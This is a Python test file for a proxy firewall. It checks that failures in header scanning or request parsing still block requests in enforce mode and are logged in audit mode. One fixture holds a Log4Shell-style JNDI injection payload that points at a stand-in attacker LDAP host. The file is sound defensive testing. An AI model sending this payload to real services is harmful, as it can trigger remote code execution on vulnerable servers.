"""A failed request-header scan cannot become an empty clean inspection view."""

import os
import tempfile
from unittest.mock import patch

import dataplane.engine.lifeform.pipeline as ND
import dataplane.engine.lifeform.policy as FW
import dataplane.engine.services.proxy as Proxy
from test_sweep_proxy_request import _Backend, _exchange, _guard


_ATTACK = (b"GET /header-scan-r21 HTTP/1.1\r\nHost: local.test\r\n"
           b"X-Probe: ${jndi:ldap://attacker.test/a}\r\n\r\n")
_BENIGN = (b"GET /benign-r21 HTTP/1.1\r\nHost: local.test\r\n"
           b"X-Probe: ordinary-value\r\n\r\n")


class _ScanSourceFault:
    def __contains__(self, _name):
        raise RuntimeError("synthetic header scan source failure")


def _case(mode):
    with tempfile.TemporaryDirectory(dir=os.environ["DUCKNET_STATE_DIR"]) as state:
        shield = ND.NetShield(state_dir=state)
        firewall = FW.AppFirewall(state_dir=state)
        assert shield.set_config(enabled=True, mode=mode, block_page=False,
                                 block_score=20, deny_score=30)["ok"]
        backend = _Backend()
        try:
            with patch.object(ND, "_SHIELD", shield), patch.object(FW, "_FW", firewall), \
                    _guard(backend) as edge:
                benign = _exchange(edge, [_BENIGN])
                benign_backend = list(backend.got)
                with patch.object(Proxy, "_SCAN_SKIP_HDR", _ScanSourceFault()):
                    attack = _exchange(edge, [_ATTACK])
                attack_backend = list(backend.got[len(benign_backend):])
                metrics = dict(edge.metrics)
                events = shield.events(100)
            return benign, benign_backend, attack, attack_backend, metrics, events
        finally:
            backend.close()


def test_enforce_header_scan_failure_never_reaches_backend():
    benign, forwarded, attack, attack_backend, metrics, _events = _case("enforce")
    assert benign.startswith(b"HTTP/1.1 200 OK"), benign[:100]
    assert any(b"X-Probe: ordinary-value" in row for row in forwarded), forwarded
    assert not attack.startswith(b"HTTP/1.1 200 OK"), attack[:100]
    assert attack_backend == [], attack_backend
    assert metrics.get("dropped", 0) >= 1, metrics


def test_audit_header_scan_failure_is_visible_and_observe_only():
    benign, forwarded, attack, attack_backend, _metrics, events = _case("audit")
    assert benign.startswith(b"HTTP/1.1 200 OK"), benign[:100]
    assert any(b"X-Probe: ordinary-value" in row for row in forwarded), forwarded
    assert attack.startswith(b"HTTP/1.1 200 OK"), attack[:100]
    assert any(b"X-Probe: ${jndi:ldap://attacker.test/a}" in row
               for row in attack_backend), attack_backend
    assert any(e.get("kind") == "audit" and e.get("rule") == "header_scan_unavailable"
               and e.get("would") == "block" for e in events), events


class _FaultingHead(bytes):
    def split(self, *_args, **_kwargs):
        raise RuntimeError("synthetic request-head parse failure")


def test_request_head_parse_failure_cannot_replace_blocked_path_with_root():
    with tempfile.TemporaryDirectory(dir=os.environ["DUCKNET_STATE_DIR"]) as state:
        shield = ND.NetShield(state_dir=state)
        firewall = FW.AppFirewall(state_dir=state)
        assert shield.set_config(enabled=True, block_page=False,
                                 blocked_urls=["/blocked-r21"])["ok"]
        backend = _Backend()
        original = Proxy._parse_head

        def fail_inside_parser(wire):
            return original(_FaultingHead(wire))

        try:
            with patch.object(ND, "_SHIELD", shield), patch.object(FW, "_FW", firewall), \
                    _guard(backend) as edge:
                benign = _exchange(
                    edge, [b"GET /benign-r21 HTTP/1.1\r\nHost: local.test\r\n\r\n"])
                prior = list(backend.got)
                with patch.object(Proxy, "_parse_head", side_effect=fail_inside_parser):
                    attack = _exchange(
                        edge, [b"GET /blocked-r21 HTTP/1.1\r\nHost: local.test\r\n\r\n"])
                after = list(backend.got[len(prior):])
            assert benign.startswith(b"HTTP/1.1 200 OK"), benign[:100]
            assert any(b"GET /benign-r21" in row for row in prior), prior
            assert not attack.startswith(b"HTTP/1.1 200 OK"), attack[:100]
            assert after == [], after
        finally:
            backend.close()
